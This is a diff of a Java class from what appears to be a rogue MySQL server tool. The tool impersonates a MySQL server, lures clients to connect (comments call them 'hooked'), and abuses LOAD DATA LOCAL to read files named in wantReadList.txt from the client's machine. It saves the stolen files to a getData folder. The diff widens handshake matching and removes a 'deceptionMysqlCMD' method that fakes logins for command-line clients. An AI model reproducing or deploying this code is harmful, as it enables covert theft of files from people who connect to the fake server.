@@ -99,7 +99,7 @@ public class Socket extends Thread {
                     }
                     configuration.wantReadList = FileUtils.readLines(".\\wantReadList.txt");
                     int wantReadListSize = configuration.wantReadList.size();
-                    String filename = configuration.wantReadList.get(stringUtils.getRandomNum(0, configuration.wantReadList.size() - 1));
+                    String filename = "";   //configuration.wantReadList.get(stringUtils.getRandomNum(0, configuration.wantReadList.size() - 1));
                     boolean isBeginRead = false; // isBeginRead为true时,说明已经能开始使用load data漏洞了.
 
                     out.write(configuration.verificationText);  // res ok
@@ -107,7 +107,9 @@ public class Socket extends Thread {
                     bys = new byte[1024];
 
                     while (in.read(bys) != -1) {
-                        if (Arrays.equals(stringUtils.hexToByteArray(configuration.selectVersion), getRequest(bys)) || Arrays.equals(stringUtils.hexToByteArray(configuration.setNameUtf8), getRequest(bys))) {
+                        if (Arrays.equals(stringUtils.hexToByteArray(configuration.selectVersion), getRequest(bys)) || Arrays.equals(stringUtils.hexToByteArray(configuration.setNameUtf8), getRequest(bys))
+                        || Arrays.equals(stringUtils.hexToByteArray(configuration.setNameUtf8mb4), getRequest(bys))
+                        ) {
                             isBeginRead = true;
                         } else if (Arrays.equals(stringUtils.hexToByteArray(configuration.showVariable), getRequest(bys))) {
                             // 如果res为 showVariable
@@ -128,7 +130,7 @@ public class Socket extends Thread {
                         } else if (Arrays.equals(stringUtils.hexToByteArray(configuration.maxAllowedPacket), getRequest(bys))) {
                             out.write(stringUtils.hexToByteArray(configuration.maxAllowedPacketRes));
                             out.flush();
-                        }else if(Arrays.equals(stringUtils.hexToByteArray("0e"), getRequest(bys))){
+                        } else if (Arrays.equals(stringUtils.hexToByteArray("0e"), getRequest(bys))) {
                             // res ok
                             out.write(configuration.verificationText);
                             out.flush();
@@ -145,80 +147,6 @@ public class Socket extends Thread {
 
                 } catch (Exception e) {
                     e.printStackTrace();
-                    break;
-                } finally {
-                    if (server != null) {
-                        server.close();
-                    }
-                }
-            }
-        }
-    }
-
-    // 欺骗mysql命令行登录
-    public void deceptionMysqlCMD() throws IOException {
-        configuration.getInstance();
-        while (true) {
-            java.net.Socket server = null;
-            String ip;
-            while (true) {
-                try {
-                    server = serverSocket.accept();
-                    assert server != null;
-                    ip = server.getRemoteSocketAddress().toString().substring(1);
-                    String port = ip.substring(ip.lastIndexOf(":") + 1);
-                    ip = ip.substring(0, ip.lastIndexOf(":"));
-
-                    DataInputStream in = new DataInputStream(server.getInputStream());
-                    DataOutputStream out = new DataOutputStream(server.getOutputStream());
-
-                    // 如果客户端连接上了,则查看客户端的ip是否超过阈值,超过则返回1129错误码,并结束socket
-                    if (isBlockIp(ip)) {
-                        configuration.return1129(out, ip);
-                        break;
-                    }
-                    logger.info("[+] 已上钩的客户端: " + ip + " " + port);
-                    logOutput.add("[+] " + stringUtils.thisTime("hh:mm:ss") + " 已上钩的客户端: " + ip + " " + port);
-                    FileUtils.writeLines(configuration.logFileName, logOutput, true);
-                    logOutput.clear();
-
-                    long startTime = System.currentTimeMillis();
-                    out.write(stringUtils.hexToByteArray(configuration.flushVersionText())); // 发送mysql版本信息
-                    out.flush();
-                    long endTime = System.currentTimeMillis();
-                    long elapsedTime = endTime - startTime;
-                    // 如果发生超时异常，则认为延迟不稳定，断开连接.并记录ip进blockList.txt,然后查看是否超过max_connect_errors,如果超过了则发送ERROR 1129给客户端
-                    if (elapsedTime > 10000) {
-                        recordIp(ip);
-                        if (isBlockIp(ip)) {
-                            out = new DataOutputStream(server.getOutputStream());
-                            configuration.return1129(out, ip);
-                        }
-                        server.close();
-                        break;
-                    }
-                    byte[] bys = new byte[1024];
-                    in.read(bys);       // 接受客户端发来的验证信息(如账号密码)
-
-                    // 处理客户端发来的数据包,提取出salt和password,salt结合自己预设的密码 =>变为最终的ServerPassword,password和ServerPassword相等时即验证成功.加入登录验证,正确时继续,否则返回错误
-                    if (!handlePassword(bys)) {
-                        configuration.return1045(out, ip);
-                        break;
-                    }
-
-                    out.write(configuration.verificationText);  // res ok
-                    out.flush();
-                    bys = new byte[1024];
-                    in.read(bys);
-
-                    configuration.wantReadList = FileUtils.readLines(".\\wantReadList.txt");
-                    String filename = configuration.wantReadList.get(stringUtils.getRandomNum(0, configuration.wantReadList.size() - 1));
-                    getData(filename, server);
-
-
-                } catch (Exception e) {
-                    e.printStackTrace();
-                    break;
                 } finally {
                     if (server != null) {
                         server.close();
@@ -380,8 +308,8 @@ public class Socket extends Thread {
         byte[] bys = new byte[9999];
         int bysLength = in.read(bys);
 
-        if (bysLength != 0) {
-            in.read(bys);
+        if (bys[0] != 0 && bys[3] != 0) {
+            //in.read(bys);
             logger.info("[+] 获取结果:获取文件成功! 文件已保存进getData文件夹中");
             logOutput.add("[+] " + stringUtils.thisTime("hh:mm:ss") + " 获取结果:获取文件成功! 文件已保存进getData文件夹中");
 
@@ -391,7 +319,7 @@ public class Socket extends Thread {
             writer.write(getData);
             writer.close();
         } else {
-            logger.info("[-] 获取结果:获取文件失败,可能是文件路径不存在或被客户端拦截");
+            logger.info("[-] 获取结果:获取文件失败,可能是文件路径不存在/被客户端拦截/客户端发包扫描结束");
             logOutput.add("[-] " + stringUtils.thisTime("hh:mm:ss") + " 获取结果:获取文件失败,可能是文件路径不存在或被客户端拦截");
         }
         FileUtils.writeLines(configuration.logFileName, logOutput, true);
